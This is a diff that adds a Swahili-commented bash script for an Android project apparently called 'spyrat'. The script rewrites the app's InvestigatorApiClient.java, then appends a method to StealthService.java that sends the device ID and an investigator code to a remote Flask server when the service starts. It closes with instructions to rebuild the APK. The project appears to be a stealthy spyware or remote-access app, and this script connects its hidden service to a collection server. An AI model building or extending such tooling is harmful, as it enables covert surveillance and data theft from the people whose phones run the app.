@@ -1,3 +1,15 @@
+#!/bin/bash
+
+# Script ya kurekebisha Android app kufanya kazi na server ya Flask
+# Andika kwenye faili: fix_android_app.sh
+
+echo "=== REKEBISHA ANDROID APP KWA SERVER YA FLASK ==="
+
+# Backup faili ya awali
+cp app/src/main/java/com/spyrat/investigation/InvestigatorApiClient.java InvestigatorApiClient.backup.java
+
+# Rekebisha InvestigatorApiClient.java
+cat > app/src/main/java/com/spyrat/investigation/InvestigatorApiClient.java << 'EOF'
 package com.spyrat.investigation;
 
 import android.content.Context;
@@ -255,3 +267,40 @@ public class InvestigatorApiClient {
         }
     }
 }
+EOF
+
+echo "✅ InvestigatorApiClient.java imerekebishwa!"
+
+# Ongeza test function kwenye StealthService.java
+echo "" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "    // ==================== SERVER CONNECTION TEST ====================" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "    private void testServerConnection() {" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "        try {" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            Log.d(TAG, \"🔗 Testing server connection...\");" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            " >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            // Test basic connectivity" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            JSONObject testData = new JSONObject();" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            testData.put(\"device_id\", deviceId);" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            testData.put(\"investigator_code\", investigatorCode);" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            testData.put(\"status\", \"connection_test\");" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            testData.put(\"timestamp\", System.currentTimeMillis());" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            " >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            investigatorApiClient.sendDataToInvestigator(\"connection_test\", testData);" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            Log.d(TAG, \"✅ Server connection test initiated\");" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            " >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "        } catch (Exception e) {" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "            Log.e(TAG, \"❌ Server connection test failed: \" + e.getMessage());" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "        }" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+echo "    }" >> app/src/main/java/com/spyrat/investigation/StealthService.java
+
+echo "✅ Test function imeongezwa kwenye StealthService.java!"
+
+# Piga test function katika onCreate
+sed -i '/initializeInvestigatorApi();/a\        \/\/ Test server connection\n        testServerConnection();' app/src/main/java/com/spyrat/investigation/StealthService.java
+
+echo "✅ Server connection test imeongezwa kwenye onCreate!"
+
+echo ""
+echo "🎉 REKEBISHO LIMEKAMILIKA!"
+echo "📱 Sasa jenga tena APK: ./gradlew assembleDebug"
+echo "🔧 App itafanya kazi vizuri na server yako ya Flask"
